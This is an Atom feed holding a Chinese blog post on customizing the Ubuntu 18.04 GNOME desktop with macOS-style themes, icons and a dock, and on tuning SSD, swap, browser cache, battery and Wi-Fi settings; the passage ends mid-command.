<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>我的安全世界</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-02-04T09:34:17.730Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>LoongEyes</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux桌面美化</title>
    <link href="http://yoursite.com/2019/06/17/Linux%E6%A1%8C%E9%9D%A2%E7%BE%8E%E5%8C%96/"/>
    <id>http://yoursite.com/2019/06/17/Linux桌面美化/</id>
    <published>2019-06-17T02:33:00.000Z</published>
    <updated>2020-02-04T09:34:17.730Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="系统安装"><a href="#系统安装" class="headerlink" title="系统安装"></a>系统安装</h1><p><code>Ubuntu 18.04.2 LTS</code></p><hr><h1 id="操作系统初始配置"><a href="#操作系统初始配置" class="headerlink" title="操作系统初始配置"></a>操作系统初始配置</h1><ol><li><p>打开“软件和更新”</p></li><li><p>更改<code>Ubuntu</code>软件更新源，使系统自动选择当前网络下最好的更新服务器</p><p> <img src="/images/Linuxmeihua/1.png" alt="1.png"></p><p> <img src="/images/Linuxmeihua/2.png" alt="2.png"></p><p> <img src="/images/Linuxmeihua/3.png" alt="3.png"></p><p> <img src="/images/Linuxmeihua/4.png" alt="4.png"></p></li><li><p>登陆<code>Ubuntu</code>云端账号</p><p> <img src="/images/Linuxmeihua/5.png" alt="5.png"></p><p> 当登陆<code>Ubuntu</code>云端账号后，勾选<code>Canonical Livepatch</code></p><p> <img src="/images/Linuxmeihua/6.png" alt="6.png"></p><p> 用于：当官方发布需进行重启的安装补丁时，<code>Livepatch</code>可保证不中断当前工作、不重启的情况下安装补丁</p></li><li><p>安装英伟达显卡驱动</p><p> <img src="/images/Linuxmeihua/7.png" alt="7.png"></p></li><li><p>保存更改后的配置</p><p> <img src="/images/Linuxmeihua/8.png" alt="8.png"></p></li></ol><hr><h1 id="操作系统美化"><a href="#操作系统美化" class="headerlink" title="操作系统美化"></a>操作系统美化</h1><ol><li><p>查看当前<code>Gnome</code>桌面的版本</p><p> <img src="/images/Linuxmeihua/9.png" alt="9.png"></p></li><li><p>更新软件源</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><p> <img src="/images/Linuxmeihua/10.png" alt="10.png"></p></li><li><p>安装优化(<code>gnome-tweaks</code>)</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gnome-tweaks</span><br></pre></td></tr></table></figure><p> <img src="/images/Linuxmeihua/11.png" alt="11.png"></p></li><li><p>安装<code>chrome-gnome-shell</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install chrome-gnome-shell</span><br></pre></td></tr></table></figure><p> <img src="/images/Linuxmeihua/12.png" alt="12.png">  </p></li><li><p>浏览器访问</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://extensions.gnome.org</span><br></pre></td></tr></table></figure></li><li><p>安装浏览器扩展</p><p> <img src="/images/Linuxmeihua/13.png" alt="13.png"> </p><p> 安装失败</p><p> <img src="/images/Linuxmeihua/14.png" alt="14.png"> </p><p> 解决方法：</p><ol><li><p>浏览器访问<code>about:config</code></p></li><li><p>找到<code>xpinstall.signatures.required</code>，修改值为<code>false</code></p><p><img src="/images/Linuxmeihua/15.png" alt="15.png"> </p></li></ol></li></ol><h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><ol><li><p>安装浏览器扩展<code>User Themes</code></p><p> <img src="/images/Linuxmeihua/16.png" alt="16.png"></p></li><li><p>访问<code>https://www.gnome-look.org</code> </p><p> <img src="/images/Linuxmeihua/17.png" alt="17.png"></p></li><li><p>搜索<code>McMojave</code>，下载</p><p> <img src="/images/Linuxmeihua/18.png" alt="18.png"></p></li><li><p>将<code>McMojave-light.tar.xz</code>    解压后剪切至当前用户家目录下的<code>.themes/</code>(需新建)目录中</p></li><li><p>设置<code>tweaks</code></p><p> 修改应用主题为<code>Mojave-light</code></p><p> <img src="/images/Linuxmeihua/19.png" alt="19.png"></p></li><li><p>则系统主题已被修改</p><p> <img src="/images/Linuxmeihua/20.png" alt="20.png"></p></li></ol><h2 id="图标"><a href="#图标" class="headerlink" title="图标"></a>图标</h2><ol><li><p>访问<code>https://www.gnome-look.org</code>，搜索<code>cupertino icons</code>，下载</p><p>  <img src="/images/Linuxmeihua/21.png" alt="21.png"></p></li><li><p>将<code>Cupertino.tar.xz</code>解压后剪切至当前用户家目录下的<code>.icons/</code>(需新建)目录中</p></li><li><p>设置<code>tweaks</code></p><p> 修改图标为<code>Cupertino</code></p><p> <img src="/images/Linuxmeihua/22.png" alt="22.png"></p></li><li><p>则图标样式已被修改</p><p> <img src="/images/Linuxmeihua/23.png" alt="23.png"></p></li></ol><h2 id="鼠标指针"><a href="#鼠标指针" class="headerlink" title="鼠标指针"></a>鼠标指针</h2><ol><li><p>访问<code>https://www.gnome-look.org</code>，搜索<code>OSX EI Capitan</code>，下载</p><p> <img src="/images/Linuxmeihua/24.png" alt="24.png"></p></li><li><p>将<code>175749-OSX-ElCap.tar.bz2</code>解压后的目录下的<code>OSX-ElCap</code>剪切至当前用户家目录下的<code>.icons/</code>目录中，进入此目录，执行</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./install.sh</span><br></pre></td></tr></table></figure><p> <img src="/images/Linuxmeihua/25.png" alt="25.png"></p><p> 选择3，安装鼠标主题</p></li><li><p>设置<code>tweaks</code></p><p> 修改光标为<code>OSX-ElCap</code></p><p> <img src="/images/Linuxmeihua/26.png" alt="26.png"></p></li></ol><h2 id="Gnome-shell主题"><a href="#Gnome-shell主题" class="headerlink" title="Gnome shell主题"></a>Gnome shell主题</h2><ol><li><p>访问<code>https://www.gnome-look.org</code>，搜索<code>macOS MOJAVE</code>，下载</p><p> <img src="/images/Linuxmeihua/27.png" alt="27.png"></p></li><li><p>将<code>OSX.for.Dash.to.PANEL.tar.xz</code>解压，进入此目录</p></li><li><p>进入<code>FONT</code>目录，打开两个字体文件，点击安装</p></li><li><p>进入<code>3.26-3.28</code>目录(此名称标识了<code>Gnome</code>的版本)，将其中的<code>Mojave</code>剪切至当前用户家目录下的<code>.themes/</code>中</p></li><li><p>将<code>.themes/Mojave-light/gnome-shell/assets/</code>下的<code>activities.svg</code>复制至<code>.themes/Mojave/gnome-shell/assets/</code>中</p></li><li><p>打开<code>.themes/Mojave-light/gnome-shell/</code>目录下的<code>gnome-shell.css</code>文件</p><p> 搜索<code>#panel #panelActiv</code></p><p> <img src="/images/Linuxmeihua/28.png" alt="28.png"></p><p> 将对应配置内容复制到<code>.themes/Mojave/gnome-shell/</code>目录下的<code>gnome-shell.css</code>文件对应位置上</p><p> <img src="/images/Linuxmeihua/29.png" alt="29.png"></p></li><li><p>设置<code>tweaks</code></p><p> 修改<code>shell</code>为<code>Mojave</code></p><p> <img src="/images/Linuxmeihua/30.png" alt="30.png"></p></li><li><p>修改窗口标题、界面、文档字体为<code>san francisco</code></p><p> <img src="/images/Linuxmeihua/45.png" alt="45.png"></p></li></ol><h2 id="常用gnome扩展插件"><a href="#常用gnome扩展插件" class="headerlink" title="常用gnome扩展插件"></a>常用gnome扩展插件</h2><p>访问<code>https://extensions.gnome.org</code>，安装<code>NetSpeed</code>、<code>OpenWeather</code></p><h2 id="plank-Dock"><a href="#plank-Dock" class="headerlink" title="plank Dock"></a>plank Dock</h2><ol><li><p>安装<code>plank</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install plank</span><br></pre></td></tr></table></figure></li><li><p>卸载<code>Ubuntu</code>自带<code>Dock</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt remove gnome-shell-extension-ubuntu-dock</span><br></pre></td></tr></table></figure></li><li><p>将<code>plank</code>加入开机自启</p><p> 设置<code>tweaks</code></p><p> <img src="/images/Linuxmeihua/31.png" alt="31.png"></p></li><li><p>隐藏侧边<code>Dock</code></p><p> <img src="/images/Linuxmeihua/32.png" alt="32.png"></p><p> 访问<code>https://extensions.gnome.org</code>，安装<code>Hide Dash X</code>即可</p></li><li><p>重启操作系统</p></li><li><p>访问<code>https://www.gnome-look.org</code>，搜索<code>Transparent Plank Theme</code>，下载</p><p> <img src="/images/Linuxmeihua/33.png" alt="33.png"></p></li><li><p>将<code>Transparent 2.0.tar.gz</code>解压后剪切至当前用户家目录下的<code>.local/share/plank/themes</code>目录中</p></li><li><p>设置<code>plank</code>主题</p><p> <img src="/images/Linuxmeihua/34.png" alt="34.png"></p></li></ol><h2 id="GDM主题-锁屏界面"><a href="#GDM主题-锁屏界面" class="headerlink" title="GDM主题(锁屏界面)"></a>GDM主题(锁屏界面)</h2><ol><li><p>访问<code>https://www.gnome-look.org</code>，搜索<code>High Ubunterra</code>，下载</p><p> <img src="/images/Linuxmeihua/35.png" alt="35.png"></p></li><li><p>将<code>High_Ubunterra_2.3(noPass).tar.xz</code>解压，进入解压目录，执行</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x install.sh</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure><p> <img src="/images/Linuxmeihua/36.png" alt="36.png"></p></li><li><p>按<code>Alt+F2</code>，输入<code>r</code>，回车</p><p> <img src="/images/Linuxmeihua/37.png" alt="37.png"></p></li><li><p>设置桌面壁纸与锁屏壁纸</p><p> <img src="/images/Linuxmeihua/38.png" alt="38.png"></p><p> 桌面</p><p> <img src="/images/Linuxmeihua/39.png" alt="39.png"></p><p> 锁屏</p><p> <img src="/images/Linuxmeihua/40.png" alt="40.png"></p></li></ol><h2 id="任务切换动画效果"><a href="#任务切换动画效果" class="headerlink" title="任务切换动画效果"></a>任务切换动画效果</h2><ol><li><p>访问<code>https://extensions.gnome.org</code>，安装<code>Cover-flow Alt-Tab</code></p></li><li><p>设置<code>tweaks</code></p><p> <img src="/images/Linuxmeihua/41.png" alt="41.png"></p></li></ol><h2 id="Plymouth主题-开机引导画面"><a href="#Plymouth主题-开机引导画面" class="headerlink" title="Plymouth主题(开机引导画面)"></a>Plymouth主题(开机引导画面)</h2><ol><li><p>访问<code>https://www.gnome-look.org</code>，选择<code>Plymouth Themes</code>类型，选择合适的主题</p></li><li><p>按照主题配置文档进行设置即可</p></li></ol><hr><h1 id="conky"><a href="#conky" class="headerlink" title="conky"></a>conky</h1><p>系统信息监控与展示</p><ol><li><p>桌面工具，展示性编程文件</p></li><li><p><code>CPU</code>、内存、硬盘性能参数</p></li><li><p>结合其他工具获取系统信息(硬件温度、音乐播放、站外资源请求等)</p></li><li><p>配合<code>lua</code>、<code>python</code>开发语言实现复杂功能</p></li><li><p>需要大量配置文件的编辑优化</p></li><li><p>许多效果需显卡驱动支持</p></li></ol><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install conky-all</span><br></pre></td></tr></table></figure><h2 id="conky美化主题"><a href="#conky美化主题" class="headerlink" title="conky美化主题"></a>conky美化主题</h2><p><a href="https://www.deviantart.com/custom-linux/gallery/39357745/Conky-Themes" target="_blank" rel="noopener">https://www.deviantart.com/custom-linux/gallery/39357745/Conky-Themes</a></p><hr><h1 id="操作系统性能优化"><a href="#操作系统性能优化" class="headerlink" title="操作系统性能优化"></a>操作系统性能优化</h1><h2 id="优化原则"><a href="#优化原则" class="headerlink" title="优化原则"></a>优化原则</h2><ol><li><p>完全不优化或过度优化都不可取</p></li><li><p>笔记本用户重点关注电池、<code>SSD</code>硬盘寿命</p></li></ol><h2 id="SSD硬盘优化"><a href="#SSD硬盘优化" class="headerlink" title="SSD硬盘优化"></a>SSD硬盘优化</h2><h3 id="SSD分区对齐"><a href="#SSD分区对齐" class="headerlink" title="SSD分区对齐"></a>SSD分区对齐</h3><p>目前主流<code>Linux</code>操作系统已自动对齐文件系统和分区–页面大小4096字节</p><h3 id="激活SATA驱动器的AHCI特性"><a href="#激活SATA驱动器的AHCI特性" class="headerlink" title="激活SATA驱动器的AHCI特性"></a>激活SATA驱动器的AHCI特性</h3><p>某些<code>BIOS</code>/<code>UEFI</code>只有在激活此特性后才可正确识别<code>SSD</code>硬盘</p><p><code>Advanced</code>–<code>Integrated Peripherais</code>–<code>AHCI</code></p><h3 id="减少写操作"><a href="#减少写操作" class="headerlink" title="减少写操作"></a>减少写操作</h3><p>频繁的写操作会磨损<code>SSD</code></p><h4 id="over-provisioning"><a href="#over-provisioning" class="headerlink" title="over-provisioning"></a>over-provisioning</h4><p>通过保存1/4未分配的空间提高<code>SSD</code>的性能和寿命(最大不超过<code>10G</code>)</p><p>较新的<code>SSD</code>内置预留空间(用户无法访问)，不再需要<code>over-provisioning</code></p><h4 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h4><p>推荐使用<code>ext4</code>文件系统</p><p><code>ext4</code>日志不会产生较多的写操作，日志对于系统崩溃恢复非常重要，建议保留</p><p>不建议使用<code>BTRFS</code>文件系统，它会导致大量的写操作</p><h4 id="禁用读文件时访问时间戳的写操作"><a href="#禁用读文件时访问时间戳的写操作" class="headerlink" title="禁用读文件时访问时间戳的写操作"></a>禁用读文件时访问时间戳的写操作</h4><p>系统在读文件时会对文件的时间戳进行写操作，但并没有实际的用处</p><p>为除<code>swap</code>之外的每个分区增加<code>noatime</code>选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/fstab</span><br><span class="line"></span><br><span class="line">增加</span><br><span class="line">noatime,errors=remount-ro 01</span><br></pre></td></tr></table></figure><p>重启生效</p><h3 id="定期清理硬盘"><a href="#定期清理硬盘" class="headerlink" title="定期清理硬盘"></a>定期清理硬盘</h3><h4 id="TRIM"><a href="#TRIM" class="headerlink" title="TRIM"></a>TRIM</h4><p>默认每周启动一次，对硬盘进行清理</p><h5 id="查看是否支持TRIM"><a href="#查看是否支持TRIM" class="headerlink" title="查看是否支持TRIM"></a>查看是否支持TRIM</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo hdparm -I /dev/sda | grep TRIM</span><br></pre></td></tr></table></figure><h5 id="查看TRIM的运行状态"><a href="#查看TRIM的运行状态" class="headerlink" title="查看TRIM的运行状态"></a>查看TRIM的运行状态</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl status fstrim</span><br></pre></td></tr></table></figure><h5 id="手动执行TRIM"><a href="#手动执行TRIM" class="headerlink" title="手动执行TRIM"></a>手动执行TRIM</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fstrim -v /</span><br></pre></td></tr></table></figure><h5 id="设置每天清理"><a href="#设置每天清理" class="headerlink" title="设置每天清理"></a>设置每天清理</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -v /etc/systemd/system/fstrim.timer.d</span><br><span class="line">sudo touch /etc/systemd/system/fstrim.timer.d/override.conf</span><br><span class="line">gedit admin:///etc/systemd/system/fstrim.timer.d/override.conf</span><br><span class="line"></span><br><span class="line">[Timer]</span><br><span class="line">OnCalendar=</span><br><span class="line">OnCalendar=daily</span><br></pre></td></tr></table></figure><h2 id="CPU微码"><a href="#CPU微码" class="headerlink" title="CPU微码"></a>CPU微码</h2><p>用于提高性能或为安全补丁</p><h3 id="intel-CPU"><a href="#intel-CPU" class="headerlink" title="intel CPU"></a>intel CPU</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install intel-microcode</span><br></pre></td></tr></table></figure><h3 id="AMD-CPU"><a href="#AMD-CPU" class="headerlink" title="AMD CPU"></a>AMD CPU</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install amd64-microcode</span><br></pre></td></tr></table></figure><h2 id="交换分区-文件"><a href="#交换分区-文件" class="headerlink" title="交换分区/文件"></a>交换分区/文件</h2><p><code>Ubuntu</code>操作系统默认当内存剩余60%时就将内存中的数据写入<code>SWAP</code>中，这样会导致运行缓慢。减少使用<code>SWAP</code>可提高性能</p><p>通过修改<code>swappiness</code>内核参数(0-100)来决定<code>RAM</code>写入<code>SWAP</code>的百分比</p><p>查看当前<code>swappiness</code>内核参数设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/vm/swappiness</span><br></pre></td></tr></table></figure><p>修改<code>swappiness</code>内核参数设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">增加</span><br><span class="line">vm.swappiness=10</span><br></pre></td></tr></table></figure><h2 id="硬盘缓存"><a href="#硬盘缓存" class="headerlink" title="硬盘缓存"></a>硬盘缓存</h2><p>正常情况下，程序等待写硬盘结束后，才进行下一步操作</p><p>若数据只写入缓存就进行下一步操作，则速度提升。但<strong>存在数据丢失的风险</strong></p><p>开启此功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Disk工具--Drive Settings--Enable Write Cache</span><br></pre></td></tr></table></figure><h2 id="提升显示效果-防止撕裂"><a href="#提升显示效果-防止撕裂" class="headerlink" title="提升显示效果(防止撕裂)"></a>提升显示效果(防止撕裂)</h2><p>针对英伟达显卡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/default/grub</span><br><span class="line"></span><br><span class="line">修改为</span><br><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet nvidia-drm.modeset=1&quot;</span><br></pre></td></tr></table></figure><p>生效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo update-grub</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><p>验证设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xrandr --verbose | grep PRIME</span><br></pre></td></tr></table></figure><h2 id="Firefox浏览器优化"><a href="#Firefox浏览器优化" class="headerlink" title="Firefox浏览器优化"></a>Firefox浏览器优化</h2><h3 id="修改Firefox网络缓存"><a href="#修改Firefox网络缓存" class="headerlink" title="修改Firefox网络缓存"></a>修改Firefox网络缓存</h3><p>将<code>Firefox</code>网络缓存放入<code>RAM</code>，可提高运行速度</p><ol><li><p>访问<code>about:config</code></p></li><li><p>禁用<code>Firefox</code>将缓存写入硬盘</p><p> 搜索<code>browser.cache.disk.enable</code>，将其修改为<code>false</code></p></li><li><p>开启<code>Firefox</code>将缓存写入内存</p><p> 搜索<code>browser.cache.memory.enable</code>，将其修改为<code>true</code></p></li><li><p>设置<code>Firefox</code>缓存使用的最大的内存空间</p><p> 新建<code>integer</code>，参数设置为<code>browser.cache.memory.capacity</code>，值为204800</p></li></ol><h3 id="禁用sessionstore"><a href="#禁用sessionstore" class="headerlink" title="禁用sessionstore"></a>禁用sessionstore</h3><p><code>sessionstore</code>：当<code>Firefox</code>意外崩溃后，重新启动后<code>Firefox</code>会进行恢复，这会导致大量的写操作，禁用可提高性能，保护硬盘，但会导致无法进行恢复</p><ol><li><p>访问<code>about:config</code></p></li><li><p>搜索<code>browser.sessionstore.interval</code>，修改值为15000000</p></li></ol><h3 id="禁用Firefox无必要的网络访问"><a href="#禁用Firefox无必要的网络访问" class="headerlink" title="禁用Firefox无必要的网络访问"></a>禁用Firefox无必要的网络访问</h3><p><code>Firefox</code>会周期请求<code>http://detectportal.firefox.com/success.txt</code>，用于网络探测</p><ol><li><p>访问<code>about:config</code></p></li><li><p>搜索<code>network.captive-portal-service.enabled</code>，修改值为<code>false</code></p></li></ol><h2 id="Chrome优化"><a href="#Chrome优化" class="headerlink" title="Chrome优化"></a>Chrome优化</h2><h3 id="限制Chrome写硬盘"><a href="#限制Chrome写硬盘" class="headerlink" title="限制Chrome写硬盘"></a>限制Chrome写硬盘</h3><p><code>settings</code>–<code>Advanced</code>–<code>Privacy</code>–关闭<code>Use a prediction service to load pages more quickly</code></p><h2 id="禁用休眠"><a href="#禁用休眠" class="headerlink" title="禁用休眠"></a>禁用休眠</h2><p>休眠时磁盘会挂起，会导致大量的写操作，对<code>SSD</code>尤其不利</p><p><code>Ubuntu</code>中默认已禁用休眠</p><h2 id="碎片整理"><a href="#碎片整理" class="headerlink" title="碎片整理"></a>碎片整理</h2><p><code>Linux</code>无必要进行碎片整理，碎片整理会导致大量的写操作，会短时间内毁坏<code>SSD</code></p><h2 id="优化启动项"><a href="#优化启动项" class="headerlink" title="优化启动项"></a>优化启动项</h2><p>删除不需要的启动项</p><ol><li><p>将系统隐藏启动项进行显示</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i &apos;s/NoDisplay=true/NoDisplay=false/g&apos; /etc/xdg/autostart/*.desktop</span><br></pre></td></tr></table></figure></li><li><p>设置启动项</p></li></ol><p><code>startup applications</code>工具</p><h2 id="系统清理"><a href="#系统清理" class="headerlink" title="系统清理"></a>系统清理</h2><ol><li><p><code>stacer</code></p><p> <a href="https://github.com/oguzhaninan/Stacer" target="_blank" rel="noopener">https://github.com/oguzhaninan/Stacer</a></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:oguzhaninan/stacer -y</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install stacer -y</span><br></pre></td></tr></table></figure></li><li><p><code>bleachbit</code></p><p> 已集成于<code>Ubuntu</code>操作系统中</p></li></ol><h2 id="优化笔记本电池寿命"><a href="#优化笔记本电池寿命" class="headerlink" title="优化笔记本电池寿命"></a>优化笔记本电池寿命</h2><p>手动优化及其复杂，使用<code>tlp</code>工具进行自动优化</p><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install tlp tlp-rdw</span><br></pre></td></tr></table></figure><p>启动优化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tlp start</span><br></pre></td></tr></table></figure><p>查看优化配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tlp-stat</span><br></pre></td></tr></table></figure><h2 id="CPU温度监视"><a href="#CPU温度监视" class="headerlink" title="CPU温度监视"></a>CPU温度监视</h2><p><code>sensors</code>工具</p><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install lm-sensors</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sensors</span><br></pre></td></tr></table></figure><h2 id="限制inode缓存"><a href="#限制inode缓存" class="headerlink" title="限制inode缓存"></a>限制inode缓存</h2><p>在<code>Linux</code>上，一个文件由一个<code>inode</code>表示。<code>inode</code>在系统管理员看来是每一个文件的唯一标识，在系统里面，<code>inode</code>是一个结构，存储了关于这个文件的大部分信息。一个<code>inode</code>一般占了<code>128KB</code>或者是<code>256KB</code></p><p>限制<code>inode</code>缓存的代价是某些系统项将在<code>RAM</code>中保留更长的时间，将减少用于一般任务的可用<code>RAM</code>的数量</p><p>建议内存大于<code>4GB</code>的计算机限制<code>inode</code>缓存，可提高计算机运行速度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gedit admin:///etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">增加配置</span><br><span class="line"># Improve cache management</span><br><span class="line">vm.vfs_cache_pressure=50</span><br></pre></td></tr></table></figure><h2 id="tmp目录"><a href="#tmp目录" class="headerlink" title="/tmp目录"></a>/tmp目录</h2><p><code>/tmp</code>目录用于存放计算机的中间或临时数据</p><p><code>/tmp</code>默认存放在硬盘中，将其存放到内存中会加快运行速度，因会占用内存空间，建议<code>8G</code>以上内存用户设置</p><ol><li><p>将<code>/tmp</code>转至<code>/tmpfs</code>(放入内存)</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cp -v /usr/share/systemd/tmp.mount /etc/systemd/system/</span><br><span class="line">sudo systemctl enable tmp.mount &amp;&amp; reboot</span><br></pre></td></tr></table></figure></li><li><p>查看状态</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status tmp.mount</span><br></pre></td></tr></table></figure></li><li><p>取消使用<code>/tmpfs</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -v /etc/systemd/system/tmp.mount</span><br></pre></td></tr></table></figure></li></ol><h2 id="无线优化"><a href="#无线优化" class="headerlink" title="无线优化"></a>无线优化</h2><h3 id="禁用无线芯片电源管理"><a href="#禁用无线芯片电源管理" class="headerlink" title="禁用无线芯片电源管理"></a>禁用无线芯片电源管理</h3><p>以提高用电为代价，提高速度和无线质量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gedit admin:///etc/NetworkManager/conf.d/default-wifi-powersave-on.conf</span><br><span class="line"></span><br><span class="line">修改</span><br><span class="line">wifi.powersave=2</span><br></pre></td></tr></table></figure><p>重启生效</p><h3 id="开启英特尔无线网卡Tx-AMPDU功能"><a href="#开启英特尔无线网卡Tx-AMPDU功能" class="headerlink" title="开启英特尔无线网卡Tx AMPDU功能"></a>开启英特尔无线网卡Tx AMPDU功能</h3><h4 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h4><ol><li><p>英特尔无线芯片运行在<code>iwlwifi</code>驱动程序上</p></li><li><p>打开<code>Tx AMPDU</code>可提高无线速度(部分芯片可能不稳定)</p></li></ol><h4 id="检查驱动是否为iwlwifi"><a href="#检查驱动是否为iwlwifi" class="headerlink" title="检查驱动是否为iwlwifi"></a>检查驱动是否为iwlwifi</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsmod | grep iwlwifi</span><br></pre></td></tr></table></figure><h4 id="开启提速"><a href="#开启提速" class="headerlink" title="开启提速"></a>开启提速</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;options iwlwifi 11n_disable=8&quot; | sudo tee /etc/modprobe.d/iwlwifi11n.conf</span><br></pre></td></tr></table></figure><h4 id="删除配置"><a href="#删除配置" class="headerlink" title="删除配置"></a>删除配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -v /etc/modprobe.d/iwlwifi11n.conf</span><br></pre></td></tr></table></figure><h2 id="部分重启-partial-reboot"><a href="#部分重启-partial-reboot" class="headerlink" title="部分重启/partial reboot"></a>部分重启/partial reboot</h2><p><code>Linux</code>如果死机，可尝试<code>partial reboot</code>(按下<code>ctrl+alt+back</code>重启桌面)</p><p>配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gedit admin:///etc/default/keyboard</span><br><span class="line"></span><br><span class="line">增加</span><br><span class="line">XKBOPTIONS=&quot;terminate:ctrl_alt_bksp&quot;</span><br></pre></td></tr></table></figure><p>重启生效</p><h2 id="FireJail沙箱"><a href="#FireJail沙箱" class="headerlink" title="FireJail沙箱"></a>FireJail沙箱</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install 